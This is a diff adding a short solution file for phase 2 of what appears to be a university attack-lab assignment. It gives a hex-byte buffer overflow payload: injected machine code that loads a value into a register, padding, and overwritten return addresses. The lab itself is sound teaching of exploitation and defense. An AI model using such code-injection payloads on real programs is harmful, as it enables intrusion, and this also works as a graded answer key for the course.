@@ -1,0 +1,11 @@
+Attack Lab Phase 2
+
+Buffer input:
+
+/* start of injected code */
+48 c7 c7 6b 79 4f 5a c3 /* mov param to %rdi and retq = 8 bytes */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  /* 40 bytes so far (end of buf) */
+/* make address point to start of injected code (address of buf) */
+18 17 68 55 00 00 00 00
+68 17 40 00 00 00 00 00 
